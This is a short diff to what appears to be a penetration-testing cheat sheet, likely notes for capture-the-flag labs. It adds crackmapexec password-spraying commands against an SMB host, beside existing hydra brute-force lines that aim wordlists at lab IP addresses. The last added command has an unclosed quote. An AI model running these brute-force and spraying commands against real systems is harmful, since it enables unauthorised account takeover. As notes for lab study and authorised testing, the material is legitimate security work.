@@ -58,6 +58,14 @@ hydra -l username -P passwords.txt smb://10.10.10.169
 hydra -L users.txt -P passwords.txt smb://10.10.10.169
 ```
 
+```
+crackmapexec smb 10.10.11.129 -u usernames.txt -p password123 --continue-on-success
+```
+
+```
+crackmapexec smb 10.10.11.129 -u users.txt -p passwords.txt --continue-on-success | grep -F '[+]
+```
+
 ## WinRM
 
 ```shell
